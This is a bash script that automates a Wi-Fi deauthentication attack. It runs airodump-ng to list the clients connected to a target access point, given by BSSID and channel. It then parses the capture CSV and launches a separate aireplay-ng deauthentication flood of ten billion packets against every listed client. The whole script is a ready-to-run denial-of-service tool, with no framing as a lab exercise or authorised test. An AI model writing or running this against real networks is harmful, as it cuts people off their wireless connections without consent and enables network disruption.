#!/bin/bash

#clean up all the previous record
find  . -name 'network_record-*' -exec rm {} \;

wifiMAC="$1"
channelNumber="$2"
airodump-ng --bssid "${wifiMAC}" --channel "${channelNumber}" --write network_record wlan0

Counter=0
declare -a clientList
while IFS=",", read col1 col2
do
	if [ "$Counter" -gt 4 ]; then
		clientList+=($col1)
	fi
	let Counter=Counter+1
done < network_record-01.csv

#last array is empty
declare -i len
len=${#clientList[@]}
len=len-1

for i in $(seq 0 $len);
do
	if [ "$i" -lt "$len" ];
	then
		xterm -e aireplay-ng --deauth 10000000000 -a "${wifiMAC}" -c "${clientList[i]}" wlan0 &
	fi
done

echo "reach the end"
